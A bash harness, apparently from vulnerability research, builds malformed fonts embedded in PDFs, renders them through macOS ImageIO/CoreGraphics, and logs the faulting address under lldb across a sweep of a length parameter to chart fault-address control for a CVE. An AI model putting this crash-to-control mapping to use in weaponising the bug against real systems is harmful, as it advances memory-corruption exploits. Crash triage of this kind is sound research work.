#!/bin/bash
# M3c: fine L sweep across the crash window — the L->fault-address control curve
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.abspath('.'))
from gen_k2 import build_font
for L in (30500, 30750, 31000, 31125, 31250, 31500, 31750, 32250, 32500, 32750):
    build_font(f"k2_f{L}.ttf", L)
    print(L)
PYEOF
for L in 30500 30750 31000 31125 31250 31500 31750 32250 32500 32750; do
  ./venv/bin/python gen_pdf.py k2_f${L}.pdf k2_f${L}.ttf
  ./render k2_f${L}.pdf >/dev/null 2>&1; echo "fine $L rc=$?" >> fine_map.txt
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_f${L}.pdf" \
    -o "continue" -k "register read" -k "thread backtrace all" -o "quit" \
    ./render > fine_${L}.txt 2>&1 || true
  FA=$(grep -m1 "stop reason = EXC" fine_${L}.txt | sed 's/.*address=//')
  SITE=$(grep -m1 -A1 "stop reason = EXC" fine_${L}.txt | grep "frame #0" | sed 's/.*aa_cache_render/aa_cache_render/')
  echo "fine $L fault=$FA site=$SITE" >> fine_map.txt
done
cat fine_map.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/fine_*.txt findings/
ls findings/ | wc -l
